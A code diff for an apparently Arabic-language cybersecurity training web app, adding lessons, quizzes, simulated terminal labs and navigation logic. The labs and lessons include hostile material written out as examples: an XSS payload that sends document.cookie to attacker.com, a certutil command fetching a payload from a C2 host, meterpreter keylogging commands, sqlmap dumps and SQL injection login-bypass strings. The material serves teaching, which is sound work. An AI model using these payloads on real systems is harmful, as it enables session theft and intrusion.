+<span class="danger">meterpreter &gt;</span> <span class="cmd">screenshot</span>     <span class="comment"># لقطة شاشة</span>
+<span class="danger">meterpreter &gt;</span> <span class="cmd">keyscan_start</span>  <span class="comment"># تسجيل المفاتيح</span>
+          </div>
+        </div>
+        <div class="warn-box"><p>⚠️ استخدام Metasploit على أنظمة بدون إذن مكتوب جريمة جنائية. استخدمه فقط على بيئات تدريبية مثل HackTheBox وTryHackMe.</p></div>
+      `
+    }
+  ],
+  3: [
+    {
+      id:'3-1', title:'مركز العمليات الأمنية SOC', desc:'كيف يعمل SOC؟ أدوار الفريق وعملية تحليل الحوادث',
+      topics:['ما هو SOC؟','مستويات المحللين','SIEM وSIEM Tools','تحليل الأحداث','Incident Response'],
+      fact:'SOC Analyst هو الأكثر طلباً في سوق العمل الأمني — نقص عالمي يتجاوز مليون محلل SOC في 2025!',
+      content:`
+        <h3>ما هو SOC؟</h3>
+        <p>Security Operations Center: مركز مراقبة الأمن السيبراني يعمل 24/7. يراقب ويحلل ويستجيب للتهديدات الأمنية في الوقت الحقيقي.</p>
+        <h3>مستويات المحللين</h3>
+        <table class="data-table">
+          <tr><th>المستوى</th><th>المسمى</th><th>المهام</th></tr>
+          <tr><td>Tier 1</td><td>Alert Analyst</td><td>مراقبة SIEM، فرز التنبيهات، الرد الأولي</td></tr>
+          <tr><td>Tier 2</td><td>Incident Responder</td><td>التحقيق العميق، تحليل الحوادث، الاحتواء</td></tr>
+          <tr><td>Tier 3</td><td>Threat Hunter</td><td>بحث استباقي عن التهديدات، تطوير القواعد</td></tr>
+        </table>
+        <h3>SIEM — قلب الـ SOC</h3>
+        <p>Security Information and Event Management: يجمع ويحلل ويرتبط السجلات الأمنية من كل أجهزة الشبكة في مكان واحد.</p>
+        <div class="info-box"><p>// أشهر حلول SIEM: Splunk (الأقوى)، IBM QRadar، Microsoft Sentinel، ELK Stack (مجاني)، ArcSight</p></div>
+        <h3>Incident Response — الاستجابة للحوادث</h3>
+        <p>منهجية PICERL:</p>
+        <p><strong>Preparation:</strong> التحضير والخطط المسبقة</p>
+        <p><strong>Identification:</strong> اكتشاف الحادثة وتصنيفها</p>
+        <p><strong>Containment:</strong> عزل الأنظمة المصابة</p>
+        <p><strong>Eradication:</strong> إزالة التهديد</p>
+        <p><strong>Recovery:</strong> استعادة الأنظمة</p>
+        <p><strong>Lessons Learned:</strong> التعلم من الحادثة</p>
+      `
+    }
+  ],
+  4: [
+    {
+      id:'4-1', title:'Red Team Operations', desc:'استراتيجيات وتقنيات الـ Red Team الاحترافية',
+      topics:['Red Team vs Pentest','C2 Frameworks','Living off the Land','Active Directory Attacks','Evasion Techniques'],
+      fact:'تكلفة عمليات الـ Red Team الاحترافية تبدأ من $50,000 لمؤسسة متوسطة — لكنها توفر ملايين من خسائر الاختراق الحقيقي!',
+      content:`
+        <h3>الفرق بين Red Team وPentest</h3>
+        <p><strong>Penetration Testing:</strong> نطاق محدد، وقت قصير، هدف الثغرات التقنية.</p>
+        <p><strong>Red Team:</strong> محاكاة خصم حقيقي كامل، أسابيع/أشهر، يختبر الأشخاص والعمليات والتقنية معاً.</p>
+        <h3>C2 Frameworks — قيادة التحكم</h3>
+        <p>Command & Control: البنية التحتية للتواصل مع الأجهزة المخترقة.</p>
+        <table class="data-table">
+          <tr><th>الأداة</th><th>الاستخدام</th></tr>
+          <tr><td>Cobalt Strike</td><td>المعيار الاحترافي — $3,500/سنة</td></tr>
+          <tr><td>Sliver</td><td>بديل مجاني احترافي من BishopFox</td></tr>
+          <tr><td>Havoc</td><td>مفتوح المصدر حديث وقوي</td></tr>
+          <tr><td>Metasploit</td><td>للتدريب والمختبرات</td></tr>
+        </table>
+        <h3>Living off the Land (LotL)</h3>
+        <p>استخدام الأدوات الموجودة في الجهاز المستهدف نفسه للتهرب من الكشف. لا برامج خبيثة جديدة!</p>
+        <div class="term-block">
+          <div class="term-code">
+<span class="comment"># استخدام PowerShell للاستطلاع:</span>
+<span class="danger">powershell</span> <span class="flag">-enc</span> [base64_encoded_command]
+
+<span class="comment"># WMI للتنفيذ عن بعد:</span>
+<span class="danger">wmic</span> /node:TARGET process call create "cmd.exe /c..."
+
+<span class="comment"># certutil لتحميل ملفات:</span>
+<span class="danger">certutil</span> <span class="flag">-urlcache -f</span> http://C2/payload.exe out.exe
+          </div>
+        </div>
+        <h3>Active Directory Attacks</h3>
+        <p>90% من المؤسسات تستخدم AD — لذلك مهاجمته هدف رئيسي. Kerberoasting، Pass-the-Hash، DCSync، BloodHound لتحليل العلاقات.</p>
+        <div class="info-box"><p>// BloodHound هي أقوى أداة لتحليل Active Directory وإيجاد أقصر مسار للـ Domain Admin!</p></div>
+      `
+    }
+  ]
+};
+
+// =====================================================
+// DATA: QUIZ
+// =====================================================
+const QUIZZES = {
+  1: [
+    {q:'ما هو مبدأ CIA في أمن المعلومات؟',opts:['Cisco Internet Architecture','Confidentiality, Integrity, Availability','Control, Identity, Access','Certificate, Internet, Application'],c:1,exp:'CIA Triad = السرية (Confidentiality) + النزاهة (Integrity) + التوافر (Availability) — ثلاثة مبادئ أساس أمن المعلومات.'},
+    {q:'ما الفرق الرئيسي بين Virus وWorm؟',opts:['Virus أخطر دائماً','Worm ينتشر تلقائياً بدون تدخل بشري، Virus يحتاج تنفيذ ملف','لا فرق بينهما','Virus يؤثر على Linux فقط'],c:1,exp:'Worm يستطيع الانتشار الذاتي عبر الشبكة، بينما Virus يحتاج المستخدم لتشغيل ملف مصاب.'},
+    {q:'ما هو خوارزمية التشفير الأقوى والأكثر استخداماً حالياً؟',opts:['DES','MD5','AES-256','RSA-512'],c:2,exp:'AES-256 هو معيار التشفير المتقدم المعتمد عالمياً للبيانات الحساسة.'},
+    {q:'SQL Injection يستهدف أي طبقة في التطبيق؟',opts:['طبقة الشبكة','طبقة قاعدة البيانات','طبقة التطبيق فقط','طبقة التشفير'],c:1,exp:'SQL Injection يحقن أوامر خبيثة في استعلامات SQL لاستغلال قاعدة البيانات.'},
+    {q:'ما هو الـ Phishing؟',opts:['هجوم على الشبكة','خداع المستخدمين للكشف عن بيانات حساسة عبر رسائل مزيفة','تشفير الملفات وطلب فدية','فحص المنافذ المفتوحة'],c:1,exp:'Phishing نوع من الهندسة الاجتماعية يخدع المستخدمين لإدخال بياناتهم في مواقع مزيفة.'},
+    {q:'ما هو Ransomware؟',opts:['برنامج مراقبة','برنامج يشفر الملفات ويطلب فدية','نوع من الـ Firewall','بروتوكول تشفير'],c:1,exp:'Ransomware يشفر ملفات الضحية ويطلب فدية مالية مقابل مفتاح فك التشفير.'},
+    {q:'ما دالة الـ Hash المكسورة والغير آمنة؟',opts:['SHA-256','SHA-3','MD5','BLAKE2'],c:2,exp:'MD5 مكسورة منذ سنوات ولا تُعدّ آمنة. استخدم SHA-256 أو SHA-3 بدلاً منها.'},
+    {q:'ما هو XSS؟',opts:['Cross-Site Scripting — حقن JavaScript خبيث','XML Security Standard','Cross-Server System','eXtra Secure Script'],c:0,exp:'XSS هو حقن كود JavaScript خبيث في صفحات الويب يُنفَّذ في متصفح الضحية.'},
+    {q:'ما أهمية استخدام Linux في الأمن السيبراني؟',opts:['أرخص فقط','معظم أدوات الأمن مبنية لـ Linux وتعمل بشكل أفضل عليه','أسرع من Windows','يصعب اختراقه فقط'],c:1,exp:'معظم أدوات الأمن كـ Nmap وMetasploit وWireshark تعمل أصلاً على Linux.'},
+    {q:'ما الفرق بين IDS وIPS؟',opts:['IDS يكتشف ويمنع، IPS يكتشف فقط','IDS يكتشف فقط وينبّه، IPS يكتشف ويمنع تلقائياً','لا فرق','IDS للشبكات، IPS للخوادم'],c:1,exp:'IDS = Intrusion Detection System (كاميرا فقط). IPS = Intrusion Prevention System (حارس أمن).'}
+  ],
+  2: [
+    {q:'ما هي المراحل الخمس لاختبار الاختراق بالترتيب الصحيح؟',opts:['Exploit→Scan→Recon→Report→Post','Recon→Scan→Exploit→Post-Exploit→Report','Scan→Recon→Report→Exploit→Post','Report→Recon→Scan→Exploit→Post'],c:1,exp:'المنهجية الصحيحة: Reconnaissance → Scanning → Exploitation → Post-Exploitation → Reporting'},
+    {q:'ما وظيفة الـ -sV في Nmap؟',opts:['فحص UDP','كشف إصدارات الخدمات','فحص stealth','حفظ النتائج لملف'],c:1,exp:'-sV يطلب من Nmap محاولة كشف إصدار كل خدمة مكتشفة.'},
+    {q:'ما هو SQL Injection الأبسط والأشهر لتجاوز تسجيل الدخول؟',opts:["admin' OR '1'='1",'1=1','DROP TABLE users','SELECT * FROM users'],c:0,exp:"عبارة ' OR '1'='1 تجعل الشرط دائماً صحيحاً وتتجاوز كلمة المرور."},
+    {q:'ما هو الـ Payload في Metasploit؟',opts:['الهدف المُراد اختراقه','الكود الذي يُنفَّذ بعد الاختراق','قاعدة بيانات الثغرات','واجهة المستخدم'],c:1,exp:'Payload هو الكود المُنفَّذ على الجهاز بعد نجاح الـ Exploit، مثل Meterpreter shell.'},
+    {q:'ما الفرق بين Passive وActive Reconnaissance؟',opts:['Passive أخطر','Passive بدون تلامس مباشر، Active يتفاعل مع الهدف','لا فرق','Active أبطأ'],c:1,exp:'Passive Recon لا يُحدث أي تلامس مع الهدف (Google، WHOIS)، بينما Active يتفاعل معه مباشرة.'},
+    {q:'ما هو Privilege Escalation؟',opts:['رفع سرعة الاتصال','الانتقال من صلاحيات محدودة لصلاحيات أعلى مثل root/admin','إنشاء حساب جديد','تشفير الاتصال'],c:1,exp:'Privilege Escalation = رفع مستوى الصلاحيات من مستخدم عادي إلى admin/root لتوسيع الوصول.'},
+    {q:'ما هو Burp Suite؟',opts:['أداة فحص شبكات','أداة تحليل حزم','وكيل (Proxy) لاختبار أمان تطبيقات الويب','أداة كسر كلمات مرور'],c:2,exp:'Burp Suite أداة وكيل تقف بين المتصفح والخادم لتحليل وتعديل طلبات HTTP/HTTPS.'},
+    {q:'ما هو هجوم IDOR؟',opts:['هجوم على قواعد البيانات','الوصول لموارد مستخدمين آخرين بتغيير مرجع في الـ URL','هجوم على الشبكة','نوع من Ransomware'],c:1,exp:'IDOR (Insecure Direct Object Reference) = تغيير رقم في URL للوصول لبيانات مستخدمين آخرين.'}
+  ],
+  3: [
+    {q:'ما هو SIEM؟',opts:['Server Intrusion Emergency Module','Security Information and Event Management','System Integration and Event Monitoring','Secure Internet Exchange Module'],c:1,exp:'SIEM يجمع ويحلل ويربط السجلات الأمنية من جميع الأنظمة للكشف عن التهديدات.'},
+    {q:'ما هي المرحلة الأولى في منهجية Incident Response؟',opts:['Containment','Eradication','Preparation','Identification'],c:2,exp:'Preparation هي الأولى — التخطيط المسبق وإعداد الفرق والأدوات قبل حدوث أي حادثة.'},
+    {q:'ما أداة تحليل الذاكرة الأشهر في التحقيق الجنائي الرقمي؟',opts:['Wireshark','Nmap','Volatility','Metasploit'],c:2,exp:'Volatility أقوى أداة لتحليل memory dumps واستخراج العمليات والاتصالات والبيانات منها.'},
+    {q:'ما مستوى SOC المسؤول عن Threat Hunting؟',opts:['Tier 1','Tier 2','Tier 3','Tier 0'],c:2,exp:'Tier 3 = Threat Hunters — يبحثون استباقياً عن التهديدات قبل أن تُكتشف بالأدوات التقليدية.'},
+    {q:'ما هو Threat Hunting؟',opts:['انتظار التنبيهات','بحث استباقي عن تهديدات غير مكتشفة بعد','تحليل Malware','كتابة قواعد SIEM'],c:1,exp:'Threat Hunting = بحث استباقي عن المهاجمين الذين قد يكونون داخل الشبكة بدون تنبيهات مسبقة.'}
+  ],
+  4: [
+    {q:'ما الفرق بين Red Team وPenetration Testing؟',opts:['لا فرق','Red Team محاكاة خصم كامل بدون قيود، Pentest نطاق محدد وزمن قصير','Pentest أقوى','Red Team أرخص'],c:1,exp:'Red Team محاكاة هجوم واقعي كامل يستمر أسابيع ويختبر الأشخاص والعمليات والتقنية.'},
+    {q:'ما هو C2 Framework؟',opts:['إطار ترميز','بنية تحتية للتحكم في الأجهزة المخترقة','نوع من Firewall','لغة برمجة'],c:1,exp:'C2 (Command & Control) يتيح للمهاجم إصدار أوامر للأجهزة المخترقة بشكل سري.'},
+    {q:'ما هي تقنية Living off the Land؟',opts:['استخدام أدوات الجهاز المستهدف نفسه لتجنب الكشف','الهجوم من المناطق الريفية','استخدام Linux فقط','هجوم على شبكات WiFi'],c:0,exp:'LotL يستخدم أدوات مبنية في Windows (PowerShell, WMI, certutil) مما يُصعب اكتشافه.'},
+    {q:'ما أداة تحليل Active Directory لإيجاد مسار للـ Domain Admin؟',opts:['Nmap','BloodHound','Wireshark','Metasploit'],c:1,exp:'BloodHound تجمع وترسم علاقات Active Directory بيانياً وتُظهر أقصر مسار للـ Domain Admin.'},
+    {q:'ما هو Bug Bounty؟',opts:['مسابقة ألعاب','برنامج تدفع فيه الشركات مكافآت لمن يكتشف ثغراتها أخلاقياً','نوع من البرامج الخبيثة','شهادة أمنية'],c:1,exp:'Bug Bounty برامج مكافآت تدفعها الشركات للباحثين الأمنيين مقابل اكتشاف ثغراتها بشكل مسؤول.'}
+  ]
+};
+
+// =====================================================
+// DATA: LABS
+// =====================================================
+const LABS = [
+  {
+    id:'lab-1', title:'فحص الشبكة بـ Nmap', diff:'easy', tags:['nmap','recon','scanning'],
+    desc:'فحص شبكة افتراضية واكتشاف الأجهزة والخدمات المفتوحة',
+    obj:'اكتشف جميع الأجهزة في شبكة 192.168.1.0/24 ثم افحص المنافذ والخدمات على الجهاز المكتشف',
+    welcome:'مرحباً في مختبر Nmap!\n\nهدفك: فحص الشبكة 192.168.1.0/24 لاكتشاف الأجهزة\nابدأ بـ: nmap -sn 192.168.1.0/24\n',
+    steps:[
+      {cmd:'nmap -sn 192.168.1.0/24', out:'Starting Nmap 7.93\nHost: 192.168.1.1 (gateway)\nHost: 192.168.1.100 (target-server)\nNmap done: 3 hosts up'},
+      {cmd:'nmap -sV -sC 192.168.1.100', out:'PORT   STATE SERVICE  VERSION\n22/tcp open  ssh      OpenSSH 7.6\n80/tcp open  http     Apache 2.4.29\n3306/tcp open mysql   MySQL 5.7.38\nOS: Linux Ubuntu 18.04'},
+      {cmd:'nmap --script vuln 192.168.1.100', out:'| http-shellshock: \n|   VULNERABLE: Shellshock\n|   CVE: CVE-2014-6271\n|_  Risk: Critical\n| mysql-empty-password:\n|_  root account has empty password!'}
+    ],
+    hints:['ابدأ بفحص المضيفين النشطين أولاً بـ -sn','ثم افحص المنافذ والإصدارات بـ -sV -sC','أخيراً ابحث عن الثغرات بـ --script vuln']
+  },
+  {
+    id:'lab-2', title:'SQL Injection يدوي', diff:'medium', tags:['sqli','web','exploitation'],
+    desc:'اكتشاف وتطبيق هجمة SQL Injection على نموذج تسجيل دخول ضعيف',
+    obj:'الهدف: تجاوز نموذج تسجيل الدخول باستخدام SQL Injection الأساسي',
+    welcome:'مرحباً في مختبر SQL Injection!\n\nهدفك: تجاوز صفحة تسجيل الدخول\nجرب: sqlmap -u "http://vuln-app/login" --forms\n',
+    steps:[
+      {cmd:'sqlmap -u "http://vuln-app/login" --forms --dbs', out:"[*] Testing connection...\n[*] Testing for SQL Injection...\n[+] Parameter 'username' is injectable!\n[+] Available databases:\n[*] information_schema\n[*] users_db"},
+      {cmd:"sqlmap -u 'http://vuln-app/login' --forms -D users_db --tables", out:'[+] Database: users_db\n+----------+\n| users    |\n| sessions |\n+----------+'},
+      {cmd:"sqlmap -u 'http://vuln-app/login' --forms -D users_db -T users --dump", out:'+-------+-----------+----------------------------------+\n| id    | username  | password                         |\n+-------+-----------+----------------------------------+\n| 1     | admin     | 5f4dcc3b5aa765d61d8327deb882cf99 |\n| 2     | john      | abc123hash                       |\n+-------+-----------+----------------------------------+'}
+    ],
+    hints:['جرب username=admin وpassword=wrong أولاً','ثم جرب username بـ: admin\'--','استخدم sqlmap لأتمتة الهجوم']
+  },
+  {
+    id:'lab-3', title:'تحليل Malware بـ Volatility', diff:'hard', tags:['forensics','memory','malware'],
+    desc:'تحليل صورة ذاكرة RAM لجهاز مصاب واكتشاف العمليات الخبيثة',
+    obj:'حلّل memory.dmp وابحث عن العمليات الخبيثة والاتصالات الشبكية المريبة',
+    welcome:'مرحباً في مختبر Memory Forensics!\n\nلديك ملف memory.dmp لجهاز مصاب\nابدأ بـ: volatility -f memory.dmp imageinfo\n',
+    steps:[
+      {cmd:'volatility -f memory.dmp imageinfo', out:'Suggested Profile(s): Win7SP1x64\nAS Layer1: AMD64PagedMemory\nDTB: 0x187000\nNUMBER OF CPUs: 4\nImage Type: Service Pack 1'},
+      {cmd:'volatility -f memory.dmp --profile=Win7SP1x64 pslist', out:'Offset PID  PPID Name\n------ ---- ---- ----\n...    4    0    System\n...    688  4    svchost.exe\n...    1337 688  cmd.exe\n...    2448 1337 nc.exe         ← مريب!\n...    3892 2448 mimikatz.exe   ← خطير!'},
+      {cmd:'volatility -f memory.dmp --profile=Win7SP1x64 netscan', out:'Proto Local           Foreign        State     PID\nTCPv4 192.168.1.100:4444 10.0.0.99:1337 ESTABLISHED 2448\n[!] اتصال مريب! nc.exe يتصل بـ C2 server!'}
+    ],
+    hints:['ابدأ بمعرفة نوع الـ Profile المناسب بـ imageinfo','ابحث عن العمليات غير الطبيعية بـ pslist','فحص الاتصالات الشبكية بـ netscan']
+  },
+  {
+    id:'lab-4', title:'كسر كلمة المرور بـ Hashcat', diff:'medium', tags:['cracking','passwords','hashes'],
+    desc:'تطبيق تقنيات كسر كلمات المرور المشفرة بـ MD5 وSHA1',
+    obj:'لديك قائمة Hashes — استخدم Hashcat لكسرها واسترداد كلمات المرور الأصلية',
+    welcome:'مرحباً في مختبر Password Cracking!\n\nلديك الـ hashes التالية:\n5f4dcc3b5aa765d61d8327deb882cf99\ne10adc3949ba59abbe56e057f20f883e\n\nابدأ بتحديد نوع الـ Hash\n',
+    steps:[
+      {cmd:'hashcat --example-hashes | grep MD5', out:'Hash mode #0 = MD5\nExample: 8743b52063cd84097a65d1633f5c74f5\nLength: 32 characters'},
+      {cmd:"echo '5f4dcc3b5aa765d61d8327deb882cf99' > hash.txt && hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt", out:'Session..........: hashcat\nStatus...........: Cracked\nHash.Target......: 5f4dcc3b5aa765d61d8327deb882cf99\n\n5f4dcc3b5aa765d61d8327deb882cf99:password\n[+] كلمة المرور: password'},
+      {cmd:"hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --show", out:'5f4dcc3b5aa765d61d8327deb882cf99:password\ne10adc3949ba59abbe56e057f20f883e:123456'}
+    ],
+    hints:['تحقق من طول الـ Hash لتحديد نوعه (MD5=32 حرف)','استخدم -m 0 لـ MD5','rockyou.txt هي أشهر قائمة كلمات مرور']
+  },
+  {
+    id:'lab-5', title:'XSS في تطبيق الويب', diff:'medium', tags:['xss','web','javascript'],
+    desc:'اكتشاف واستغلال ثغرة XSS في نموذج تعليق ضعيف',
+    obj:'اكتشف ثغرة XSS في صفحة التعليقات واستخرج الـ Session Cookie',
+    welcome:'مرحباً في مختبر XSS!\n\nالهدف: http://vuln-app/comments\nجرب إدخال HTML بسيط أولاً\nثم JavaScript\n',
+    steps:[
+      {cmd:'curl -X POST http://vuln-app/comments -d "comment=<b>test</b>"', out:'<div class="comment"><b>test</b></div>\n[+] الـ HTML يُفسَّر! الموقع لا يُنقّح المدخلات.'},
+      {cmd:'curl -X POST http://vuln-app/comments -d "comment=<script>alert(1)</script>"', out:'<div class="comment"><script>alert(1)</script></div>\n[+] JavaScript مُنفَّذ! XSS مؤكدة.'},
+      {cmd:"curl -X POST http://vuln-app/comments -d \"comment=<script>document.location='http://attacker.com/?c='+document.cookie</script>\"", out:"[+] Payload محفوظ!\nعند زيارة الضحية للصفحة سيُرسَل cookie إلى:\nattacker.com/?c=sessionid=abc123secret\n[✓] تم سرقة الـ Session Token!"}
+    ],
+    hints:['جرب إدخال HTML بسيط أولاً لفهم مستوى التنقية','ثم جرب <script>alert(1)</script>','أخيراً اسرق الـ Cookie بـ document.cookie']
+  },
+  {
+    id:'lab-6', title:'تحليل الشبكة بـ Wireshark', diff:'easy', tags:['wireshark','network','forensics'],
+    desc:'تحليل ملف pcap لاكتشاف حركة مرور مريبة وبيانات مسربة',
+    obj:'حلّل capture.pcap وابحث عن بيانات حساسة مُرسَلة بنص عادي عبر HTTP',
+    welcome:'مرحباً في مختبر Wireshark!\n\nلديك ملف: capture.pcap\nسنستخدم tshark (نسخة سطر الأوامر)\nابدأ بعرض الملخص\n',
+    steps:[
+      {cmd:'tshark -r capture.pcap -q -z io,phs', out:'Protocol Hierarchy:\n  eth: 100%\n    ip: 98.5%\n      tcp: 78%\n        http: 45%  ← الأكثر\n      udp: 20.5%'},
+      {cmd:'tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.host -e http.request.uri', out:'login.internal.com  /auth/login\nwebmail.corp.com    /send_mail'},
+      {cmd:'tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.file_data', out:'username=admin&password=S3cur3Pass123!\nusername=john.doe&password=company2024\n[!] بيانات تسجيل الدخول مُرسَلة بنص عادي عبر HTTP!'}
+    ],
+    hints:['ابدأ بعرض بروتوكولات الملف','فلتر على طلبات POST','استخرج محتوى طلبات POST']
+  }
+];
+
+// =====================================================
+// STATE
+// =====================================================
+let ST = JSON.parse(localStorage.getItem('cyberacad_v2') || 'null') || {
+  done: [], labs: [], xp: 0, quizPass: 0, streak: 1
+};
+const save = () => localStorage.setItem('cyberacad_v2', JSON.stringify(ST));
+
+let curLvl = 1, curLesIdx = 0;
+let curQLevel = 1, curQIdx = 0, qAnswered = false, qScore = 0, activeQs = [];
+let curLab = null, labStepIdx = 0;
+
+// =====================================================
+// NAVIGATION
+// =====================================================
+function goPage(id) {
+  document.querySelectorAll('.pg').forEach(p => p.classList.remove('on'));
+  document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById('pg-' + id).classList.add('on');
+  document.getElementById('nb-' + id).classList.add('active');
+  if (id === 'progress') renderProgress();
+}
+
+// =====================================================
+// LESSONS
+// =====================================================
+function openLevel(lvl) {
+  curLvl = lvl; curLesIdx = 0;
+  const ls = LESSONS[lvl];
+  if (!ls || !ls.length) { toast('قريباً — هذا المستوى قيد الإعداد!'); return; }
+  goPage('lessons');
+  document.getElementById('cur-home').style.display = 'none';
+  document.getElementById('les-view').classList.add('on');
+  loadLesson(lvl, 0);
+}
+function backToLessons() {
+  document.getElementById('cur-home').style.display = 'block';
+  document.getElementById('les-view').classList.remove('on');
+}
+function loadLesson(lvl, idx) {
+  const ls = LESSONS[lvl];
+  if (!ls || idx >= ls.length) { toast('🎉 انتهيت من دروس هذا المستوى!'); backToLessons(); return; }
+  const l = ls[idx]; curLesIdx = idx;
+  const lvlNames = {1:'LVL-01',2:'LVL-02',3:'LVL-03',4:'LVL-04'};
+  document.getElementById('bc-lvl').textContent = lvlNames[lvl];
+  document.getElementById('bc-les').textContent = l.title;
+  document.getElementById('les-num-tag').textContent = `// LESSON ${String(idx+1).padStart(2,'0')} — ${lvlNames[lvl]}`;
+  document.getElementById('les-title').textContent = l.title;
+  document.getElementById('les-desc').textContent = l.desc;
+  document.getElementById('les-body').innerHTML = l.content;
+  document.getElementById('quick-fact').textContent = l.fact;
+  document.getElementById('topic-list').innerHTML = l.topics.map((t,i)=>`<li class="${i===0?'act':''}">${t}</li>`).join('');
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+function nextLesson() {
+  const ls = LESSONS[curLvl];
+  if (curLesIdx < ls.length-1) loadLesson(curLvl, curLesIdx+1);
+  else { toast('🎉 أتممت المستوى! انتقل للمستوى التالي.'); backToLessons(); }
+}
+function prevLesson() {
+  if (curLesIdx > 0) loadLesson(curLvl, curLesIdx-1);
+  else backToLessons();
+}
+function markDone() {
+  const l = LESSONS[curLvl][curLesIdx];
+  if (!ST.done.includes(l.id)) {
+    ST.done.push(l.id); ST.xp += 30;
+    updateLvlProgress(); save(); updateHeader();
+    toast('✅ +30 XP — درس مكتمل!');
+  }
+  nextLesson();
+}
+
+function updateLvlProgress() {
+  for (let v=1;v<=4;v++) {
+    const ls = LESSONS[v]||[];
+    const done = ls.filter(l=>ST.done.includes(l.id)).length;
+    const pct = ls.length ? Math.round((done/13)*100) : 0;
+    [`lp${v}`,`lp${v}b`,`pb${v}`].forEach(id=>{const e=document.getElementById(id);if(e)e.style.width=pct+'%';});
+    const pp=document.getElementById(`pp${v}`); if(pp) pp.textContent=pct+'%';
+  }
+}
+function updateHeader() {
+  document.getElementById('h-xp').textContent = ST.xp;
+  document.getElementById('h-streak').textContent = ST.streak;
+  document.getElementById('h-less').textContent = ST.done.length;
+}
+
+// =====================================================
+// LABS
+// =====================================================
+function initLabs() {
+  document.getElementById('lab-grid').innerHTML = LABS.map(l=>`
+    <div class="lab-card" onclick="openLab('${l.id}')">
+      <div class="lab-diff diff-${l.diff}">${l.diff.toUpperCase()}</div>
+      <div class="lab-title">${l.title}</div>
+      <div class="lab-desc">${l.desc}</div>
+      <div class="lab-tags">${l.tags.map(t=>`<span class="lab-tag">${t}</span>`).join('')}</div>
+    </div>
+  `).join('');
+}
+function openLab(id) {
+  curLab = LABS.find(l=>l.id===id);
+  if (!curLab) return;
+  labStepIdx = 0;
+  document.getElementById('lab-home').style.display = 'none';
+  document.getElementById('lab-view').classList.add('on');
+  document.getElementById('lab-bc').textContent = curLab.title;
+  document.getElementById('lab-tag').textContent = `// LAB — ${curLab.diff.toUpperCase()}`;
+  document.getElementById('lab-title').textContent = curLab.title;
+  document.getElementById('lab-desc').textContent = curLab.desc;
+  document.getElementById('lab-obj').textContent = curLab.obj;
+  document.getElementById('lab-term-title').textContent = `terminal@cyberacad:~/${curLab.id}`;
+  document.getElementById('lab-screen').innerHTML = `<span style="color:var(--text-dim)">${curLab.welcome}</span>`;
+  document.getElementById('lab-input').value = '';
+}
+function backToLabs() {
+  document.getElementById('lab-home').style.display = 'block';
+  document.getElementById('lab-view').classList.remove('on');
+}
+function runCmd() {
+  const inp = document.getElementById('lab-input').value.trim();
+  if (!inp) return;
+  const sc = document.getElementById('lab-screen');
+  sc.innerHTML += `\n<span style="color:var(--green)">root@lab:~$ </span><span style="color:#fff">${inp}</span>\n`;
+  const step = curLab.steps.find(s => inp.toLowerCase().includes(s.cmd.split(' ')[0].toLowerCase())) 
+             || curLab.steps[Math.min(labStepIdx, curLab.steps.length-1)];
+  if (step) {
+    sc.innerHTML += `<span style="color:var(--text-dim)">${step.out}</span>\n`;
+    labStepIdx++;
+  } else {
+    sc.innerHTML += `<span style="color:var(--red)">bash: ${inp}: command not found\nتلميح: اضغط HINT للمساعدة</span>\n`;
+  }
+  document.getElementById('lab-input').value = '';
+  sc.scrollTop = sc.scrollHeight;
+}
+function showHint() {
+  const hint = curLab.hints[Math.min(labStepIdx, curLab.hints.length-1)];
+  const sc = document.getElementById('lab-screen');
+  sc.innerHTML += `\n<span style="color:var(--yellow)">[HINT] ${hint}</span>\n`;
+  sc.scrollTop = sc.scrollHeight;
+}
+function completeLab() {
+  if (!ST.labs.includes(curLab.id)) {
+    ST.labs.push(curLab.id); ST.xp += 60;
+    save(); updateHeader();
+    toast('🎯 +60 XP — مختبر مكتمل!');
+  }
+  backToLabs();
+}
+document.addEventListener('DOMContentLoaded', ()=>{
+  document.getElementById('lab-input').addEventListener('keydown', e=>{ if(e.key==='Enter') runCmd(); });
+});
+
+// =====================================================
+// QUIZ
+// =====================================================
+function startQuiz(lvl) {
+  curQLevel = lvl; curQIdx = 0; qScore = 0; qAnswered = false;
+  const pool = lvl===4
+    ? shuffle([...QUIZZES[1],...QUIZZES[2],...QUIZZES[3],...QUIZZES[4]]).slice(0,20)
+    : shuffle([...(QUIZZES[lvl]||[])]).slice(0,10);
+  activeQs = pool;
+  document.getElementById('quiz-sel').style.display  = 'none';
+  document.getElementById('quiz-arena').classList.add('on');
+  document.getElementById('quiz-res').classList.remove('on');
+  loadQ();
+}
+function loadQ() {
+  if (curQIdx >= activeQs.length) { showResult(); return; }
+  const q = activeQs[curQIdx];
+  document.getElementById('q-meta').textContent = `QUESTION ${curQIdx+1}/${activeQs.length}`;
+  document.getElementById('q-text').textContent = q.q;
+  document.getElementById('q-fb').className = 'q-feedback';
+  document.getElementById('btn-nxtq').style.display = 'none';
+  qAnswered = false;
+  const dots = document.getElementById('q-dots');
+  dots.innerHTML = activeQs.map((_,i)=>`<div class="q-prog-dot ${i<curQIdx?'done':i===curQIdx?'cur':''}"></div>`).join('');
+  const letters=['A','B','C','D'];
+  document.getElementById('q-opts').innerHTML = q.opts.map((o,i)=>`
+    <button class="q-opt" onclick="answerQ(${i})">
+      <div class="q-opt-key">${letters[i]}</div>${o}
+    </button>`).join('');
+}
+function answerQ(idx) {
+  if (qAnswered) return;
+  qAnswered = true;
+  const q = activeQs[curQIdx];
+  document.querySelectorAll('.q-opt')[idx].classList.add(idx===q.c?'correct':'wrong');
+  document.querySelectorAll('.q-opt')[q.c].classList.add('correct');
+  if (idx===q.c) qScore++;
+  const fb = document.getElementById('q-fb');
+  fb.textContent = (idx===q.c?'✅ صحيح! ':'❌ خطأ. ') + q.exp;
+  fb.className = 'q-feedback on ' + (idx===q.c?'ok':'ng');
+  document.getElementById('btn-nxtq').style.display = 'block';
+}
+function nextQ() { curQIdx++; loadQ(); }
+function endQuiz() { showResult(); }
+function showResult() {
+  document.getElementById('quiz-arena').classList.remove('on');
+  document.getElementById('quiz-res').classList.add('on');
+  const pct = Math.round((qScore/activeQs.length)*100);
+  const passed = pct>=60;
+  document.getElementById('res-emoji').textContent = pct===100?'🏆':pct>=80?'⚡':pct>=60?'🔐':'💀';
+  document.getElementById('res-score').textContent = `${qScore}/${activeQs.length} — ${pct}%`;
